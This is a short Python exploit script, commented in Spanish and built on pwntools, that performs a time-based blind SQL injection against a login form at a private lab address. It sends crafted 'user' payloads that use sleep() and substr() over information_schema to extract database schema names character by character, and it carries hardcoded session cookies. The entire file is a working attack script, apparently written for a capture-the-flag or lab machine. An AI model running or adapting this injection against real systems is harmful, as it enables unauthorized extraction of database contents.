#!/usr/bin/python3


import requests
import string
import time
from pwn import *
import signal, pdb


def def_handler(sig, frame):
    log.failure("Saliendo...")
    sys.exit(1)

# ctrl + c 
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://192.168.100.78/enter_network/" 

# Caracteres a utilizar
characters = string.ascii_lowercase  + "._@-,"




def sqli():
    
    
    result = ""
    
    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque")

    p2 = log.progress("Base de datos")
    
    for i in range(1, 20):
        for c in characters:
            # Construimos la consulta                            
            post_data = { "user": "admin' or if(substr((select group_concat(schema_name) from information_schema.schemata),%d,1)='%s', sleep(0.6),1)-- -" % (i, c),
                          "pass": "aaa",
                         "sub": "SEND"
                         }
            
            p1.status(post_data['user'])
            cookies = {"role": "MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%253D",
                       "user": "JGFyZ29uMmkkdj0xOSRtPTY1NTM2LHQ9NCxwPTEkT0dSTGFqZHRTbEF2ZGpWWGFtNU1WUSREVDlqOWhlb1dKVk81YWd1WElCNmdmUy9yMlJaM0RUdCtZN2wycmw5bERz"}

            start_time = time.time()
            r = requests.post(main_url, data=post_data, cookies=cookies)
            end_time = time.time()

            if end_time - start_time > 0.6:
                result += c
                p2.status("DB: %s" % result)
                break
    
    p2.success(result)

if __name__ == "__main__":
    sqli()
